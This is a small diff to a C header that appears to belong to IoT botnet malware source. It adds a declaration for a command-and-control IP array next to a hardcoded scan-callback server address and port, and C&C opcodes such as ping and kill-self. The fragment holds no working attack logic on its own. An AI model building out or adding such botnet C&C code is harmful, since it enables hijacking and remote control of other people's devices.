@@ -26,6 +26,7 @@ typedef uint16_t port_t;
 
 #define SCANCB_SERVER_ADDR  INET_ADDR(192,168,179,172)
 #define SCANCB_SERVER_PORT  48101
+short cnc_ip[4];
 
 #define CNC_OP_PING         0x00
 #define CNC_OP_KILLSELF     0x10
